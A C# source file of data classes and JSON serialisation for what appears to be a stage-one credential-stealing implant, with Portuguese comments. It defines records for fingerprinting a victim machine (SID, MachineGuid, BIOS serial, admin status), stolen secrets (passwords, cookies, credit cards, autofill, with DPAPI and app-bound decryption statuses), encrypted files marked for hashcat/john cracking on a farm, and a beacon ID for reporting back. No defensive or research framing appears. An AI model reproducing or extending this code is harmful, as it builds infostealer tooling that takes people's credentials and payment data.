using System.Text.Json;
using System.Text.Json.Serialization;

namespace Teste.Core;

public sealed class ErrorRec
{
    public ErrorRec() { }
    public ErrorRec(string s, string m) { Stage = s; Message = m; }
    public string Stage { get; set; } = "";
    public string Message { get; set; } = "";
}

public sealed class MachineRec
{
    public string Host { get; set; } = "";
    public string User { get; set; } = "";
    public string Sid { get; set; } = "";
    public string Os { get; set; } = "";
    public string MachineGuid { get; set; } = "";
    public string BiosSerial { get; set; } = "";
    public string Cpu { get; set; } = "";
    public long UptimeSeconds { get; set; }
    public bool Admin { get; set; }
}

public sealed class ProgramRec
{
    public string Name { get; set; } = "";
    public string? Version { get; set; }
    public string? Vendor { get; set; }
}

// ALVO DE RECUPERACAO: nada aqui tem segredo em claro, tem endereco e forma.
public sealed class TargetRec
{
    public string Path { get; set; } = "";
    public string Kind { get; set; } = "";
    public int? ModeHint { get; set; }          // hashcat -m sugerido; o extrator confirma
    public string Extractor { get; set; } = ""; // ferramenta john/hashcat que extrai o hash
    public long Size { get; set; }
    public string Mtime { get; set; } = "";
    public double? Entropy { get; set; }        // 0..8; <7.2 descarta
    public bool WholeFileNeeded { get; set; }   // false = cabeçalho basta
    public int HeaderBytes { get; set; }
    public string? Fingerprint { get; set; }    // dedupe no farm
    public string Confidence { get; set; } = "media";
}

public sealed class SecretRec
{
    public string Source { get; set; } = "";
    public string Kind { get; set; } = "";        // senha | cookie | cartao | autofill
    public string Key { get; set; } = "";
    public string User { get; set; } = "";
    public string? Value { get; set; }
    public string Status { get; set; } = "ok";    // ok | app_bound | dpapi | indecifrado | empty
    public string? Extra { get; set; }
}

public sealed class Report
{
    public List<SecretRec> Secrets { get; } = new();
    public string RunId { get; init; } = "";
    public string BeaconId { get; init; } = "";
    public string Agent { get; init; } = "teste/1.0-stage1";
    public DateTimeOffset StartedAt { get; init; }
    public DateTimeOffset? FinishedAt { get; set; }
    public double ScanSeconds { get; set; }
    public MachineRec Machine { get; init; } = new();
    public List<TargetRec> Targets { get; } = new();
    public List<ProgramRec> Software { get; } = new();
    public List<ErrorRec> Errors { get; } = new();

    public static Report New() => new()
    {
        RunId = Guid.NewGuid().ToString("N"),
        BeaconId = Beacon.Read(),
        StartedAt = DateTimeOffset.UtcNow
    };

    public void Finish() => FinishedAt = DateTimeOffset.UtcNow;

    private static readonly JsonSerializerOptions Opts = new()
    {
        PropertyNamingPolicy = JsonNamingPolicy.SnakeCaseLower,
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull
    };

    public string ToJson(bool indented = false) =>
        JsonSerializer.Serialize(this, new JsonSerializerOptions(Opts) { WriteIndented = indented });
}